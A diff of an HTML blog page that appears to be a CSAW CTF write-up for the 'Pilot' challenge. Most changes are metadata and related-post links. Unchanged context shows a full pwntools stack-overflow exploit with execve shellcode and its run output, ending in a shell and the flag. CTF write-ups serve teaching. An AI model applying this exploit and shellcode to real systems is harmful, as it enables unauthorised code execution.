@@ -26,7 +26,7 @@
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.imgur.com/fA4rP6S.png">
 <meta property="og:image" content="https://i.imgur.com/sXg37RZ.png">
-<meta property="og:updated_time" content="2017-09-19T05:21:16.086Z">
+<meta property="og:updated_time" content="2017-09-26T20:45:17.516Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[Pwn] CSAW - Pilot">
 <meta name="twitter:description" content="pilotCan I take your order?nc pwn.chal.csaw.io 846416:05 Eastern: Updated binary  Simple bufferoverflow , we actually have a read size of 0x40 stack the binary doesn’t have any kind of protections so">
@@ -306,7 +306,7 @@
                 <a class="category-link" href="/categories/Forensics/">Forensics</a>
               </p>
               <p class="item-title">
-                <a href="/2017/09/19/Forensics-CSAW-Best-Router/" class="title">[Forensics] CSAW - Best Router</a>
+                <a href="/2017/09/19/Forensics-CSAW-Missed-Registration/" class="title">[Forensics] CSAW - Missed Registration</a>
               </p>
               <p class="item-date">
                 <time datetime="2017-09-19T09:34:16.000Z" itemprop="datePublished">2017-09-19</time>
@@ -321,7 +321,7 @@
                 <a class="category-link" href="/categories/Forensics/">Forensics</a>
               </p>
               <p class="item-title">
-                <a href="/2017/09/19/Forensics-CSAW-Missed-Registration/" class="title">[Forensics] CSAW - Missed Registration</a>
+                <a href="/2017/09/19/Forensics-CSAW-Best-Router/" class="title">[Forensics] CSAW - Best Router</a>
               </p>
               <p class="item-date">
                 <time datetime="2017-09-19T09:34:16.000Z" itemprop="datePublished">2017-09-19</time>
@@ -380,7 +380,7 @@
         
 		
 	
-		<span class="post-wordcount hidden-xs">Word Count: 310 (words)</span>
+		<span class="post-wordcount hidden-xs">Word Count: 300 (words)</span>
 	
 	
 		<span class="post-readcount hidden-xs">Read Time: 2 (min)</span>
@@ -403,7 +403,7 @@
 <p>The offset is 40 bytes to overflow the code is very simple</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> process(<span class="string">'pwn/pilot'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'pwn.chal.csaw.io'</span>, <span class="number">8464</span>)</div><div class="line"> </div><div class="line">binary = ELF(<span class="string">'pwn/pilot'</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">local = <span class="keyword">False</span></div><div class="line">r = getConn()</div><div class="line"><span class="comment">#db.attach(r, '''</span></div><div class="line"><span class="comment">#break *0x0000000000400b35</span></div><div class="line"><span class="comment">#c''')</span></div><div class="line">r.recvuntil(<span class="string">'[*]Good Luck Pilot!....\n'</span>)</div><div class="line"></div><div class="line">nops = <span class="string">'\x90'</span>*<span class="number">4</span></div><div class="line">shellcode =  <span class="string">"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"</span></div><div class="line">padding = <span class="string">'A'</span>* (<span class="number">40</span> - len(nops)- len(shellcode)) </div><div class="line">BUFFER = int(r.recvline()[<span class="number">12</span>:],<span class="number">0</span>)</div><div class="line">log.info(<span class="string">"LEAKED BUFFER 0x%x"</span> % BUFFER)</div><div class="line"></div><div class="line"></div><div class="line">r.recvuntil(<span class="string">'[*]Command:'</span>)</div><div class="line">r.sendline(nops+ shellcode + padding+ p64(BUFFER))</div><div class="line">r.interactive()</div><div class="line">r.close()</div></pre></td></tr></table></figure>
 <p>Running it</p>
-<figure class="highlight zsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">$ python pilot.py</div><div class="line">(.venvp) evilgod@Debian ~/D/H/c/csaw&gt; python pilot.py</div><div class="line">[*] <span class="string">'~/ctf/csaw/pwn/pilot'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">    RWX:      Has RWX segments</div><div class="line">[+] Opening connection to pwn.chal.csaw.io on port 8464: Done</div><div class="line">[*] LEAKED BUFFER 0x7ffc2562d050</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">pilot</div><div class="line">$ cat flag</div><div class="line">flag&#123;1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ python pilot.py</div><div class="line">[*] <span class="string">'~/ctf/csaw/pwn/pilot'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">    RWX:      Has RWX segments</div><div class="line">[+] Opening connection to pwn.chal.csaw.io on port 8464: Done</div><div class="line">[*] LEAKED BUFFER 0x7ffc2562d050</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">pilot</div><div class="line">$ cat flag</div><div class="line">flag&#123;1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys&#125;</div></pre></td></tr></table></figure>
       
     </div>
     <footer class="article-footer">
@@ -473,7 +473,7 @@
   <ul class="pager pull-left">
     
     <li class="prev">
-      <a href="/2017/09/19/Forensics-CSAW-Missed-Registration/" title="[Forensics] CSAW - Missed Registration"><i class="fa fa-angle-left" aria-hidden="true"></i>&nbsp;&nbsp;Newer</a>
+      <a href="/2017/09/19/Forensics-CSAW-Best-Router/" title="[Forensics] CSAW - Best Router"><i class="fa fa-angle-left" aria-hidden="true"></i>&nbsp;&nbsp;Newer</a>
     </li>
     
     
